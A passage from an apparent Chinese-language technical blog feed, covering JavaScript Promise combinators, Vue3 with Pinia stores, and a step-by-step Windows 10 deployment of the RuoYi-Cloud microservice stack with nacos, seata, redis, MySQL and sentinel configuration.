<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> p1 = <span class="title class_">Promise</span>.<span class="title function_">resolve</span>(<span class="string">&#x27;A&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> p2 = <span class="title class_">Promise</span>.<span class="title function_">reject</span>(<span class="string">&#x27;Error in B&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> p3 = <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> <span class="built_in">setTimeout</span>(resolve, <span class="number">50</span>, <span class="string">&#x27;C&#x27;</span>));</span><br><span class="line"></span><br><span class="line"><span class="title class_">Promise</span>.<span class="title function_">allSettled</span>([p1, p2, p3])</span><br><span class="line">  .<span class="title function_">then</span>(<span class="function"><span class="params">results</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(results);</span><br><span class="line">    <span class="comment">/* 输出：</span></span><br><span class="line"><span class="comment">    [</span></span><br><span class="line"><span class="comment">      &#123; status: &#x27;fulfilled&#x27;, value: &#x27;A&#x27; &#125;,</span></span><br><span class="line"><span class="comment">      &#123; status: &#x27;rejected&#x27;, reason: &#x27;Error in B&#x27; &#125;,</span></span><br><span class="line"><span class="comment">      &#123; status: &#x27;fulfilled&#x27;, value: &#x27;C&#x27; &#125;</span></span><br><span class="line"><span class="comment">    ]</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure>
<h3 id="Promise-any">Promise.any()</h3>
<p>只要传入的 <code>Promise</code> 列表中 ​有任意一个变为 <code>fulfilled</code>（成功）​，<code>Promise.any()</code> 就会立即 ​返回该成功值，并忽略其他所有 <code>Promise</code> 的结果（无论其他 <code>Promise</code> 是成功还是失败）。仅在所有传入的 <code>Promise</code> 都变为 <code>rejected</code>（失败）时，才会返回一个被拒绝的 <code>Promise</code>，并返回该拒绝原因。<br>
示例：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 示例1：第一个成功值被返回</span></span><br><span class="line"><span class="title class_">Promise</span>.<span class="title function_">any</span>([</span><br><span class="line">  <span class="title class_">Promise</span>.<span class="title function_">reject</span>(<span class="string">&#x27;error1&#x27;</span>),</span><br><span class="line">  <span class="title class_">Promise</span>.<span class="title function_">resolve</span>(<span class="string">&#x27;success&#x27;</span>),</span><br><span class="line">  <span class="title class_">Promise</span>.<span class="title function_">reject</span>(<span class="string">&#x27;error2&#x27;</span>)</span><br><span class="line">]).<span class="title function_">then</span>(<span class="variable language_">console</span>.<span class="property">log</span>); <span class="comment">// 输出 &quot;success&quot;</span></span><br></pre></td></tr></table></figure>
<h3 id="Promise-race">Promise.race()</h3>
<p>返回的 <code>Promise</code> 状态由​最先敲定（无论是 <code>fulfilled</code> 还是 <code>rejected</code>）​​ 的 <code>Promise</code> 决定，且 ​立即传递其值或原因。一旦首个 Promise 敲定，其他 Promise 的结果将被完全忽略，即使后续有其他 Promise 完成。<br>
示例：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 第一个完成的 Promise 是成功</span></span><br><span class="line"><span class="keyword">const</span> fastSuccess = <span class="title class_">Promise</span>.<span class="title function_">resolve</span>(<span class="string">&#x27;成功&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> slowError = <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">_, reject</span>) =&gt;</span> </span><br><span class="line">  <span class="built_in">setTimeout</span>(reject, <span class="number">100</span>, <span class="string">&#x27;超时错误&#x27;</span>)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="title class_">Promise</span>.<span class="title function_">race</span>([fastSuccess, slowError])</span><br><span class="line">  .<span class="title function_">then</span>(<span class="function"><span class="params">result</span> =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;结果:&#x27;</span>, result)) <span class="comment">// 输出 &quot;结果: 成功&quot;</span></span><br><span class="line">  .<span class="title function_">catch</span>(<span class="function"><span class="params">error</span> =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;错误:&#x27;</span>, error));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 第一个完成的 Promise 是失败</span></span><br><span class="line"><span class="keyword">const</span> fastError = <span class="title class_">Promise</span>.<span class="title function_">reject</span>(<span class="string">&#x27;请求失败&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> slowSuccess = <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> </span><br><span class="line">  <span class="built_in">setTimeout</span>(resolve, <span class="number">100</span>, <span class="string">&#x27;延迟成功&#x27;</span>)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="title class_">Promise</span>.<span class="title function_">race</span>([fastError, slowSuccess])</span><br><span class="line">  .<span class="title function_">then</span>(<span class="function"><span class="params">result</span> =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;结果:&#x27;</span>, result))</span><br><span class="line">  .<span class="title function_">catch</span>(<span class="function"><span class="params">error</span> =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;错误:&#x27;</span>, error)); <span class="comment">// 输出 &quot;错误: 请求失败&quot;</span></span><br></pre></td></tr></table></figure>
<h3 id="Promise-resolve">Promise.resolve()</h3>
<p>返回一个新的 Promise 对象，该对象以给定的值兑现。如果值是一个 thenable 对象（即具有 then 方法），则返回的 Promise 对象会“跟随”该 thenable 对象，采用其最终的状态；否则，返回的 Promise 对象会以该值兑现。</p>
<h3 id="Promise-reject">Promise.reject()</h3>
<p>返回一个新的 Promise 对象，该对象以给定的原因拒绝。</p>
]]></content>
      <tags>
        <tag>JavaScript</tag>
        <tag>Promise</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue3 和 Pinia 的使用</title>
    <url>/posts/ffa41da9/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="Vue3-创建实例">Vue3 创建实例</h2>
<h3 id="使用-setup">使用 setup</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; createApp &#125; = <span class="title class_">Vue</span></span><br><span class="line"><span class="title function_">createApp</span>(&#123;</span><br><span class="line">    <span class="title function_">setup</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line">.<span class="title function_">mount</span>(<span class="string">&#x27;#app&#x27;</span>) <span class="comment">// 挂载到 #app</span></span><br></pre></td></tr></table></figure>
<h3 id="使用-Options-API">使用 Options API</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; createApp &#125; = <span class="title class_">Vue</span></span><br><span class="line"><span class="title function_">createApp</span>(&#123;</span><br><span class="line">    <span class="title function_">data</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> &#123;&#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">methods</span>: &#123;&#125;,</span><br><span class="line">    <span class="comment">// ...    </span></span><br><span class="line">&#125;)</span><br><span class="line">.<span class="title function_">mount</span>(<span class="string">&#x27;#app&#x27;</span>) <span class="comment">// 挂载到 #app</span></span><br></pre></td></tr></table></figure>
<h2 id="Pinia-定义-Store">Pinia 定义 Store</h2>
<p><code>defineStore</code> 的第一个参数是 store 的 id，必须是唯一的。第二个参数是一个选项对象。</p>
<h3 id="使用-Setup-Store">使用 Setup Store</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; ref &#125; = <span class="title class_">Vue</span></span><br><span class="line"><span class="keyword">const</span> &#123; defineStore &#125; = <span class="title class_">Pinia</span></span><br><span class="line"><span class="keyword">const</span> useTestStore = <span class="title function_">defineStore</span>(<span class="string">&#x27;test&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> count = <span class="title function_">ref</span>(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">const</span> doubleCount = <span class="title function_">computed</span>(<span class="function">() =&gt;</span> count.<span class="property">value</span> * <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">const</span> <span class="title function_">increment</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">        count.<span class="property">value</span>++</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> &#123; count, doubleCount, increment &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<h3 id="使用-Option-Store">使用 Option Store</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; defineStore &#125; = <span class="title class_">Pinia</span></span><br><span class="line"><span class="keyword">const</span> useTestStore = <span class="title function_">defineStore</span>(<span class="string">&#x27;test&#x27;</span>, &#123;</span><br><span class="line">    <span class="comment">// 状态数据</span></span><br><span class="line">    <span class="attr">state</span>: <span class="function">() =&gt;</span> (&#123;</span><br><span class="line">        <span class="attr">count</span>: <span class="number">1</span></span><br><span class="line">    &#125;),</span><br><span class="line">    <span class="comment">// 计算属性</span></span><br><span class="line">    <span class="attr">getters</span>: &#123;</span><br><span class="line">        <span class="attr">doubleCount</span>: <span class="function">(<span class="params">state</span>) =&gt;</span> state.<span class="property">count</span> * <span class="number">2</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">// 方法</span></span><br><span class="line">    <span class="attr">actions</span>: &#123;</span><br><span class="line">        <span class="title function_">increment</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">count</span>++</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<h2 id="Vue3-使用-Pinia">Vue3 使用 Pinia</h2>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; createApp, ref &#125; = <span class="title class_">Vue</span></span><br><span class="line"><span class="keyword">const</span> &#123; createPinia &#125; = <span class="title class_">Pinia</span></span><br><span class="line"><span class="comment">// 定义 Store</span></span><br><span class="line"><span class="keyword">const</span> useTestStore = <span class="title function_">defineStore</span>(<span class="string">&#x27;test&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> count = <span class="title function_">ref</span>(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">const</span> doubleCount = <span class="title function_">computed</span>(<span class="function">() =&gt;</span> count.<span class="property">value</span> * <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">const</span> <span class="title function_">increment</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">        count.<span class="property">value</span>++</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> &#123; count, doubleCount, increment &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Options API</span></span><br><span class="line"><span class="title function_">createApp</span>(&#123;</span><br><span class="line">    <span class="title function_">data</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="attr">testStore</span>: <span class="title function_">useTestStore</span>()</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// 使用 Pinia</span></span><br><span class="line">.<span class="title function_">use</span>(<span class="title function_">createPinia</span>())</span><br><span class="line">.<span class="title function_">mount</span>(<span class="string">&#x27;#app&#x27;</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Setup</span></span><br><span class="line"><span class="title function_">createApp</span>(&#123;</span><br><span class="line">    <span class="title function_">setup</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">const</span> testStore = <span class="title function_">useTestStore</span>()</span><br><span class="line">        <span class="keyword">return</span> &#123; testStore &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// 使用 Pinia</span></span><br><span class="line">.<span class="title function_">use</span>(<span class="title function_">createPinia</span>())</span><br><span class="line">.<span class="title function_">mount</span>(<span class="string">&#x27;#app&#x27;</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 显示 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    &#123;&#123; testStore.count &#125;&#125;</span><br><span class="line">    &#123;&#123; testStore.doubleCount &#125;&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;testStore.increment&quot;</span>&gt;</span>按钮<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>Vue3</tag>
        <tag>Pinia</tag>
      </tags>
  </entry>
  <entry>
    <title>Win10 部署若依微服务版本</title>
    <url>/posts/5a3cd46b/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1>环境部署</h1>
<blockquote>
<p>开发和生产都是此环境</p>
</blockquote>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">JDK &gt;= 1.8 (推荐1.8版本)</span><br><span class="line">Mysql &gt;= 5.7.0 (推荐5.7版本)</span><br><span class="line">Redis &gt;= 3.0</span><br><span class="line">Maven &gt;= 3.0</span><br><span class="line">Node &gt;= 12</span><br><span class="line">nacos &gt;= 2.0.4 (ruoyi-cloud &lt; 3.0 需要下载nacos &gt;= 1.4.x版本)</span><br><span class="line">sentinel &gt;= 1.6.0</span><br></pre></td></tr></table></figure>
<h1>下载</h1>
<blockquote>
<p>下载的任何文件都建议放在不包含中文的目录下</p>
</blockquote>
<h2 id="下载项目">下载项目</h2>
<p>项目链接: <a href="https://gitee.com/y_project/RuoYi-Cloud">https://gitee.com/y_project/RuoYi-Cloud</a><br>
或使用git拉取</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://gitee.com/y_project/RuoYi-Cloud.git</span><br></pre></td></tr></table></figure>
<h2 id="下载-nacos">下载 nacos</h2>
<p>官方下载: <a href="https://nacos.io/download/nacos-server/">https://nacos.io/download/nacos-server/</a></p>
<h2 id="下载-seata-server">下载 seata-server</h2>
<p>官方下载: <a href="https://nacos.io/download/nacos-server/">https://nacos.io/download/nacos-server/</a></p>
<h2 id="下载-redis">下载 redis</h2>
<p>这里用的是7.4.2版本<br>
官方下载: <a href="https://redis.io/downloads/">https://redis.io/downloads/</a></p>
<h2 id="下载-MySQL-Nginx">下载 MySQL,Nginx</h2>
<p>这里用的是小皮面板，可以集成 Nginx,MySQL,FTP等服务,这里只用到了MySQL和Nginx<br>
官方下载: <a href="https://www.xp.cn/php-study">https://www.xp.cn/php-study</a></p>
<h2 id="下载-Java">下载 Java</h2>
<p>这里用的是jdk21<br>
<a href="https://bell-sw.com/pages/downloads/">https://bell-sw.com/pages/downloads/</a></p>
<h2 id="下载-sentinel">下载 sentinel</h2>
<p>下载后放到Ruoyi-Cloud的jars文件夹(自建)内,此处用的是1.8.8版本<br>
<a href="https://github.com/alibaba/Sentinel/releases">https://github.com/alibaba/Sentinel/releases</a></p>
<h1>开发环境部署</h1>
<p>个人习惯将后端和前端分开，解压项目后将Ruoyi-Cloud文件夹重命名为ruoyi-master，将ruoyi-master内的ruoyi-ui跟ruoyi-master放到同级目录。<br>
建议使用默认端口，放行8848,9848,7848,9849</p>
<h2 id="配置-Java-环境">配置 Java 环境</h2>
<p>解压 jdk-21_windows-x64_bin.zip 到不包含中文的目录下<br>
打开环境变量<br>
<img src="a-a-e.png" alt=""><br>
<img src="a-a-f.png" alt=""><br>
添加JAVA_HOME变量<br>
<img src="a-a-g.png" alt=""><br>
点开Path变量<br>
<img src="a-a-h.png" alt=""><br>
配置到bin目录<br>
<img src="a-a-i.png" alt=""><br>
验证环境是否配置成功<br>
<img src="a-a-j.png" alt=""></p>
<h2 id="部署-nacos">部署 nacos</h2>
<p>解压 nacos-server-2.5.1.tar.gz 到不包含中文的目录下</p>
<h3 id="配置">配置</h3>
<p>编辑 nacos/bin/startup.cmd，修改 cluster 为 standalone<br>
standalone 是单机部署 ， cluster 是集群部署<br>
<img src="a-a-a.png" alt=""></p>
<p>将ruoyi-master/docker/nacos/conf/application.properties文件复制到nacos/conf/application.properties，并打开nacos/conf/application.properties修改</p>
<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring.datasource.platform</span>=<span class="string">mysql</span></span><br><span class="line"><span class="attr">db.num</span>=<span class="string">1</span></span><br><span class="line"><span class="attr">db.url.0</span>=<span class="string">jdbc:mysql://mysql-host:3306/ry-config?characterEncoding=utf8&amp;connectTimeout=1000&amp;socketTimeout=3000&amp;autoReconnect=true&amp;useUnicode=true&amp;useSSL=false&amp;serverTimezone=UTC</span></span><br><span class="line"><span class="attr">db.user</span>=<span class="string">root</span></span><br><span class="line"><span class="attr">db.password</span>=<span class="string">password</span></span><br><span class="line"></span><br><span class="line"><span class="attr">nacos.naming.empty-service.auto-clean</span>=<span class="string">true</span></span><br><span class="line"><span class="attr">nacos.naming.empty-service.clean.initial-delay-ms</span>=<span class="string">50000</span></span><br><span class="line"><span class="attr">nacos.naming.empty-service.clean.period-time-ms</span>=<span class="string">30000</span></span><br><span class="line"></span><br><span class="line"><span class="attr">management.endpoints.web.exposure.include</span>=<span class="string">*</span></span><br><span class="line"></span><br><span class="line"><span class="attr">management.metrics.export.elastic.enabled</span>=<span class="string">false</span></span><br><span class="line"><span class="attr">management.metrics.export.influx.enabled</span>=<span class="string">false</span></span><br><span class="line"></span><br><span class="line"><span class="attr">server.tomcat.accesslog.enabled</span>=<span class="string">true</span></span><br><span class="line"><span class="attr">server.tomcat.accesslog.pattern</span>=<span class="string">%h %l %u %t &quot;%r&quot; %s %b %D %&#123;User-Agent&#125;i %&#123;Request-Source&#125;i</span></span><br><span class="line"></span><br><span class="line"><span class="attr">server.tomcat.basedir</span>=<span class="string">D://home/ruoyi/nacos/tomcat/logs</span></span><br><span class="line"></span><br><span class="line"><span class="attr">nacos.security.ignore.urls</span>=<span class="string">/,/error,/**/*.css,/**/*.js,/**/*.html,/**/*.map,/**/*.svg,/**/*.png,/**/*.ico,/console-ui/public/**,/v1/auth/**,/v1/console/health/**,/actuator/**,/v1/console/server/**</span></span><br><span class="line"></span><br><span class="line"><span class="attr">nacos.core.auth.system.type</span>=<span class="string">nacos</span></span><br><span class="line"><span class="comment"># 开启认证</span></span><br><span class="line"><span class="attr">nacos.core.auth.enabled</span>=<span class="string">true</span></span><br><span class="line"><span class="attr">nacos.core.auth.default.token.expire.seconds</span>=<span class="string">18000</span></span><br><span class="line"><span class="comment"># 此字段将 nacos.core.auth.default.token.secret.key 做替换，值为base64编码后字符串长度&gt;=32的字符串</span></span><br><span class="line"><span class="attr">nacos.core.auth.plugin.nacos.token.secret.key</span>=<span class="string">6L+Z5piv5L2g55qE6ZW/5bqmPj0zMueahGJhc2U2NOe8lueggQ==</span></span><br><span class="line"><span class="attr">nacos.core.auth.caching.enabled</span>=<span class="string">true</span></span><br><span class="line"><span class="attr">nacos.core.auth.enable.userAgentAuthWhite</span>=<span class="string">false</span></span><br><span class="line"><span class="attr">nacos.core.auth.server.identity.key</span>=<span class="string">serverIdentity</span></span><br><span class="line"><span class="attr">nacos.core.auth.server.identity.value</span>=<span class="string">security</span></span><br><span class="line"></span><br><span class="line"><span class="attr">nacos.istio.mcp.server.enabled</span>=<span class="string">false</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="启动-nacos">启动 nacos</h3>
<p>双击或命令行运行 nacos/bin/startup.cmd<br>
如果出现类似于这样的错误，删除startup.cmd内所有的rem行即可。<br>
<img src="a-a-b.png" alt=""><br>
运行成功类似于下图<br>
<img src="a-a-c.png" alt=""></p>
<h2 id="部署-seata-server">部署 seata-server</h2>
<p>解压 apache-seata-2.3.0-incubating-bin.tar.gz 到不包含中文的目录下</p>
<h3 id="配置seata-server">配置seata-server</h3>
<p>编辑 seata-server/conf/application.yml</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">7091</span></span><br><span class="line"></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">seata-server</span></span><br><span class="line"></span><br><span class="line"><span class="attr">logging:</span></span><br><span class="line">  <span class="attr">config:</span> <span class="string">classpath:logback-spring.xml</span></span><br><span class="line">  <span class="attr">file:</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">$&#123;log.home:$&#123;user.home&#125;/logs/seata&#125;</span></span><br><span class="line">  <span class="attr">extend:</span></span><br><span class="line">    <span class="attr">logstash-appender:</span></span><br><span class="line">      <span class="attr">destination:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="string">:4560</span></span><br><span class="line">    <span class="attr">kafka-appender:</span></span><br><span class="line">      <span class="attr">bootstrap-servers:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="string">:9092</span></span><br><span class="line">      <span class="attr">topic:</span> <span class="string">logback_to_logstash</span></span><br><span class="line"></span><br><span class="line"><span class="attr">console:</span></span><br><span class="line">  <span class="attr">user:</span></span><br><span class="line">    <span class="attr">username:</span> <span class="string">seata</span></span><br><span class="line">    <span class="attr">password:</span> <span class="string">seata</span></span><br><span class="line"><span class="attr">seata:</span></span><br><span class="line">  <span class="attr">config:</span></span><br><span class="line">    <span class="comment"># support: nacos, consul, apollo, zk, etcd3</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">nacos</span></span><br><span class="line">    <span class="attr">nacos:</span></span><br><span class="line">      <span class="attr">server-addr:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="string">:8848</span>  <span class="comment"># nacos地址</span></span><br><span class="line">      <span class="attr">group:</span> <span class="string">SEATA_GROUP</span>  <span class="comment"># 配置文件的分组</span></span><br><span class="line">      <span class="attr">username:</span> <span class="string">nacos</span>  <span class="comment"># nacos用户名</span></span><br><span class="line">      <span class="attr">password:</span> <span class="string">nacos</span>  <span class="comment"># nacos密码</span></span><br><span class="line">      <span class="comment"># 这是默认值</span></span><br><span class="line">      <span class="attr">data-id:</span> <span class="string">seata.properties</span>  <span class="comment"># 配置文件的data id也就是配置文件名加后缀</span></span><br><span class="line">  <span class="attr">registry:</span></span><br><span class="line">    <span class="comment"># support: nacos, eureka, redis, zk, consul, etcd3, sofa</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">nacos</span></span><br><span class="line">    <span class="attr">nacos:</span></span><br><span class="line">      <span class="attr">application:</span> <span class="string">seata-server</span>   <span class="comment">#seata启动后在nacos的服务名</span></span><br><span class="line">      <span class="attr">server-addr:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="string">:8848</span>  <span class="comment"># nacos地址</span></span><br><span class="line">      <span class="attr">group:</span> <span class="string">SEATA_GROUP</span>  <span class="comment"># 配置文件的分组</span></span><br><span class="line">      <span class="attr">cluster:</span> <span class="string">default</span>  <span class="comment"># 这个歌参数在每个微服务seata时会用到</span></span><br><span class="line">      <span class="attr">username:</span> <span class="string">nacos</span>  <span class="comment"># nacos用户名</span></span><br><span class="line">      <span class="attr">password:</span> <span class="string">nacos</span>  <span class="comment"># nacos密码</span></span><br><span class="line">  <span class="attr">store:</span></span><br><span class="line">    <span class="comment"># support: file 、 db 、 redis</span></span><br><span class="line">    <span class="attr">mode:</span> <span class="string">db</span></span><br><span class="line">  <span class="comment">#  server:</span></span><br><span class="line">  <span class="comment">#    service-port: 8091 #If not configured, the default is &#x27;$&#123;server.port&#125; + 1000&#x27;</span></span><br><span class="line">  <span class="attr">security:</span></span><br><span class="line">  <span class="comment"># 此处的secretKey是nacos的 nacos.core.auth.plugin.nacos.token.secret.key</span></span><br><span class="line">    <span class="attr">secretKey:</span> <span class="string">6L+Z5piv5L2g55qE6ZW/5bqmPj0zMueahGJhc2U2NOe8lueggQ==</span></span><br><span class="line">    <span class="attr">tokenValidityInMilliseconds:</span> <span class="number">1800000</span></span><br><span class="line">    <span class="attr">csrf-ignore-urls:</span> <span class="string">/metadata/v1/**</span></span><br><span class="line">    <span class="attr">ignore:</span></span><br><span class="line">      <span class="attr">urls:</span> <span class="string">/,/**/*.css,/**/*.js,/**/*.html,/**/*.map,/**/*.svg,/**/*.png,/**/*.jpeg,/**/*.ico,/api/v1/auth/login,/version.json,/health,/error,/vgroup/v1/**</span></span><br></pre></td></tr></table></figure>
<h3 id="运行-seata-server">运行 seata-server</h3>
<p>seata-server/bin/seata-server.bat<br>
运行成功类似于下图<br>
<img src="a-a-d.png" alt=""></p>
<h2 id="部署-redis">部署 redis</h2>
<p>解压 redis-7.4.2.zip 到不包含中文的目录下</p>
<h3 id="配置-redis">配置 redis</h3>
<p>如果不设置密码可以忽略配置<br>
编辑 redis.conf<br>
找到或添加配置 requirepass</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">requirepass 密码</span><br></pre></td></tr></table></figure>
<h3 id="运行-redis">运行 redis</h3>
<p>运行成功类似于下图<br>
<img src="a-a-q.png" alt=""></p>
<h2 id="部署-mysql">部署 mysql</h2>
<p>打开小皮面板，安装成功后如下图<br>
<img src="a-a-w.png" alt=""><br>
修改数据库密码<br>
<img src="a-a-r.png" alt=""><br>
启动mysql<br>
<img src="a-a-t.png" alt=""></p>
<h3 id="配置-若依数据库">配置 若依数据库</h3>
<p>用可视化工具或命令行创建ry-cloud,ry-config,ry-seata三个库，数据库编码用utf8_general_ci<br>
ry-cloud 导入 ruoyi-master/sql/ry_2025xxxx.sql (必须),ruoyi-master/sql/quartz.sql(可选)<br>
ry-config 导入 ruoyi-master/sql/ry_config_2025xxxx.sql（必须）<br>
ry-seata 导入 ruoyi-master/sql/ry_seata_2025xxxx.sql</p>
<h2 id="运行-sentinel">运行 sentinel</h2>
<p>cmd进入ruoyi-master/jars目录，运行以下命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -Dserver.port=8718 -Dcsp.sentinel.dashboard.server=localhost:8718 -Dproject.name=sentinel-dashboard -Dcsp.sentinel.api.port=8719 -jar sentinel-dashboard-1.8.8.jar</span><br></pre></td></tr></table></figure>
<h2 id="后端运行">后端运行</h2>
<h3 id="配置-2">配置</h3>
<p>根据图片修改模块的配置<br>
<img src="a-a-y.png" alt=""></p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Tomcat</span></span><br><span class="line"><span class="attr">server:</span> </span><br><span class="line">  <span class="attr">port:</span> <span class="number">9200</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Spring</span></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="comment"># 应用名称</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">ruoyi-auth</span></span><br><span class="line">  <span class="attr">profiles:</span></span><br><span class="line">    <span class="comment"># 环境配置</span></span><br><span class="line">    <span class="attr">active:</span> <span class="string">dev</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">nacos:</span></span><br><span class="line">      <span class="attr">discovery:</span></span><br><span class="line">        <span class="comment"># 服务注册地址</span></span><br><span class="line">        <span class="attr">server-addr:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="string">:8848</span></span><br><span class="line">        <span class="attr">username:</span> <span class="string">nacos</span></span><br><span class="line">        <span class="attr">password:</span> <span class="string">nacos</span> <span class="comment"># nacos 密码</span></span><br><span class="line">      <span class="attr">config:</span></span><br><span class="line">        <span class="comment"># 配置中心地址</span></span><br><span class="line">        <span class="attr">server-addr:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="string">:8848</span></span><br><span class="line">        <span class="comment"># 配置文件格式</span></span><br><span class="line">        <span class="attr">file-extension:</span> <span class="string">yml</span></span><br><span class="line">        <span class="comment"># 共享配置</span></span><br><span class="line">        <span class="attr">shared-configs:</span></span><br><span class="line">          <span class="bullet">-</span> <span class="string">application-$&#123;spring.profiles.active&#125;.$&#123;spring.cloud.nacos.config.file-extension&#125;</span></span><br><span class="line">        <span class="attr">username:</span> <span class="string">nacos</span></span><br><span class="line">        <span class="attr">password:</span> <span class="string">nacos</span> <span class="comment"># nacos 密码</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>网关端口就是前端所请求的端口<br>
<img src="a-a-u.png" alt=""></p>
